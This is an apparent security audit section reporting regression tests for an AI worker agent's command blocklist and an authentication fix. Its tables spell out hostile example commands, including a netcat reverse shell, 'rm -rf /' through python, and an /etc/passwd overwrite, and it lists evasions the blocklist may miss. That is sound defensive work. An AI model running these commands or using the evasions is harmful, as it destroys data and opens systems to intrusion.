# 04 — P2/P3 Regression

**G6-09C audit** | Integrated commit: `bff7b0a6f8b4e35880a9c7453d4e6de343e4e001`

## 1. G6-09-S02 — Command policy expansion (P3, RESOLVED)

### What was remediated

The `checkCommandPolicy` function at `src/worker/worker-agent.ts:303-333` was extended with 5 new adversarial command patterns:

| Pattern | Example | Status |
|---|---|---|
| `nc -e /bin/sh` (reverse shell) | `nc -e /bin/sh 10.0.0.1 4444` | BLOCKED ✓ |
| `python -c` (arbitrary code exec) | `python -c 'import os; os.system("rm -rf /")'` | BLOCKED ✓ |
| `find / -delete` (alt recursive delete) | `find / -name "*.log" -delete` | BLOCKED ✓ |
| `> /etc/...` (system file overwrite) | `echo "evil" > /etc/passwd` | BLOCKED ✓ |
| `chmod 777 /etc` (system dir world-writable) | `chmod 777 /var` | BLOCKED ✓ |

### Test coverage (IT-S-03, 7 tests)

Test file: `harness/tier2-regression.test.ts`

- 1 structural test (fix comment present)
- 5 behavioral tests (each new pattern blocked)
- 1 regression test (normal development commands still allowed: `npm install`, `git status`, `echo "hello"`, `chmod 644 file.txt`, `> /tmp/test.txt`)

All 7 tests PASS.

## 2. G6-09-S03 — A2A unknown-user rejection (informational, RESOLVED)

### What was remediated

The `extractCallerFromUser` function at `src/gateway/a2a-server.ts:514-535` was changed:

**Before:** Unknown User implementations with `isAuthenticated=true` were granted `mission:submit` permission with 5 max active missions.

**After:** Unknown User implementations are rejected (returns `null`). All legitimate users go through `authenticateA2A` which constructs `AuthenticatedGatewayUser`.

### Test coverage (IT-S-10, 1 structural test)

Test file: `harness/tier2-regression.test.ts`

- 1 structural test confirming the permissive fallback is gone (no `allowedOperations: ['mission:submit']`, no `maxActiveMissions: 5`, no `maxMissionTimeoutMs: 30_000` in the function body)

Test PASSES.

## 3. Honest assessment — blacklist is NOT a complete security boundary

Per the G6-09C mandate Section 4:

> "Do not confuse a blacklist of dangerous command strings with a complete execution security boundary."

**Confirmed.** The `checkCommandPolicy` function is a **defense-in-depth backstop**, NOT a complete security boundary. The actual security model depends on:

| Layer | Implementation | Status |
|---|---|---|
| Trusted tool permissions | `WorkerGenome.tools` grants (e.g., `openbot:shell-execution`) | Verified (G6-09 audit) |
| Workspace isolation | `WORKSPACE_DIR` per worker; `cwd`-constrained exec | Verified (code inspection) |
| Worker privileges | `WorkerGenome.autonomy` (autonomous/supervised) | Verified (v1: supervised not enforced — documented limitation) |
| Filesystem restrictions | OpenBot adapter's egress filter (primary defense) | NOT audited (requires real OpenBot) |
| Command execution policy | `checkCommandPolicy` (backstop) | Verified (12 patterns) |
| Network permissions | `EGRESS_POLICY_REQUIRED` env var | Verified (set to `'0'` in production) |
| Credential separation | G6-09B env allowlist (G6-09-S01) + G6-09C scrubSecrets (C-053) | Verified |

The blacklist catches common adversarial commands but is NOT exhaustive. Novel or obfuscated commands (e.g., `bash -c 'rm -rf /'`, `find / -exec rm {} \;`, `perl -e 'system("rm -rf /")'`) may NOT be blocked. The primary defense is the OpenBot adapter's egress filter, which was NOT audited (requires real OpenBot infrastructure).

## 4. Tier 2 regression tests — full inventory

Test file: `harness/tier2-regression.test.ts` (18 tests, all PASS)

| Test ID | Closes finding | Status |
|---|---|---|
| IT-08 (2 tests) | G6-09-002 — exit code 1 path structural verification | PASS |
| IT-S-03 (7 tests) | G6-09-S02 — adversarial command policy | PASS |
| IT-S-10 (1 test) | G6-09-S03 — A2A User fallback | PASS |
| IT-11 (4 tests) | G6-09-005 — verification-phase cancellation | PASS |
| IT-10-regression (2 tests) | G6-09-003 — cross-caller idempotency | PASS |
| IT-MONO-regression (2 tests) | (additional) terminal-state monotonicity | PASS |

## 5. P2/P3 verdict

**P2_P3_REGRESSION = PASS**

- G6-09-S02 command policy: 7/7 tests PASS
- G6-09-S03 A2A fallback: 1/1 test PASS
- All Tier 2 regression tests: 18/18 PASS
- Honest disclosure: the blacklist is defense-in-depth, NOT a complete security boundary
- The OpenBot adapter's egress filter (primary defense) was NOT audited (requires real OpenBot)
